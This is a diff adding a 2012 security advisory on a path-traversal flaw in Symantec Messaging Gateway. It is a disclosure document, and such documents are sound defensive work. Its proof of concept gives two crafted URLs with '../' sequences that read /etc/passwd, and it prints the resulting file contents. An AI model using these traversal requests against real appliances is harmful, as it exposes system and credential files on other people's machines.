@@ -1,0 +1,96 @@
+=======
+Summary
+=======
+Name: Symantec Messaging Gateway - Arbitrary file download is possible with a crafted URL (authenticated)
+Release Date: 30 November 2012
+Reference: NGS00266
+Discoverer: Ben Williams <ben.williams@ngssecure.com>
+Vendor: Symantec
+Vendor Reference: 
+Systems Affected: Symantec Messaging Gateway 9.5.3-3
+Risk: Medium
+Status: Published
+
+========
+TimeLine
+========
+Discovered: 17 April 2012
+Released: 17 April 2012
+Approved: 29 April 2012
+Reported: 30 April 2012
+Fixed: 27 August 2012
+Published: 30 November 2012
+
+===========
+Description
+===========
+I. VULNERABILITY
+-------------------------
+Symantec Messaging Gateway 9.5.3-3 - Arbitrary file download is possible with a crafted URL (authenticated)
+
+II. BACKGROUND
+-------------------------
+Symantec Messaging Gateway 9.5.3-3 is the latest version, of their Email Security Appliance
+
+III. DESCRIPTION
+-------------------------
+The vulnerability would enable an attacker (who has authenticated to the web interface) to download arbitrary files from the appliance with the permissions of the Webserver user
+
+=================
+Technical Details
+=================
+IV. PROOF OF CONCEPT
+-------------------------
+Various files containing sensitive information can be downloaded using a crafted URL for example:
+
+http://192.168.1.59:41080/brightmail/export?type=logs&logFile=../../../etc/passwd&logType=1&browserType=1
+
+Which produces a file containing:
+
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+news:x:9:13:news:/etc/news:
+uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+games:x:12:100:games:/usr/games:/sbin/nologin
+gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
+ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+nobody:x:99:99:Nobody:/:/sbin/nologin
+rpm:x:37:37::/var/lib/rpm:/bin/bash
+ntp:x:38:38::/etc/ntp:/sbin/nologin
+vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
+postfix:x:100:101::/home/postfix:/bin/bash
+mailwall:x:500:501::/home/mailwall:/bin/bash
+mysql:x:501:103::/home/mysql:/bin/bash
+bcc:x:502:99::/home/bcc:/bin/bash
+support:x:503:503::/home/support:/bin/bash
+admin:x:504:501::/home/admin:/bin/rbash
+sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+pcap:x:77:77::/var/arpwatch:/sbin/nologin
+named:x:25:25:Named:/var/named:/sbin/nologin
+
+Simliar issues can be seen in other places such as here:
+
+http://192.168.1.59:41080/brightmail/admin/restore/download.do?no-cache=false&displayTab=restore&restoreSource=APPLIANCE&localBackupFileSelection=../../etc/passwd
+
+===============
+Fix Information
+===============
+An updated version of the software has been released to address the vulnerability:
+
+http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120827_00
+
+NCC Group Research
+http://www.nccgroup.com/research
+
+
+For more information please visit <a href="http://www.mimecast.com">http://www.mimecast.com<br>
+This email message has been delivered safely and archived online by Mimecast.
+</a>
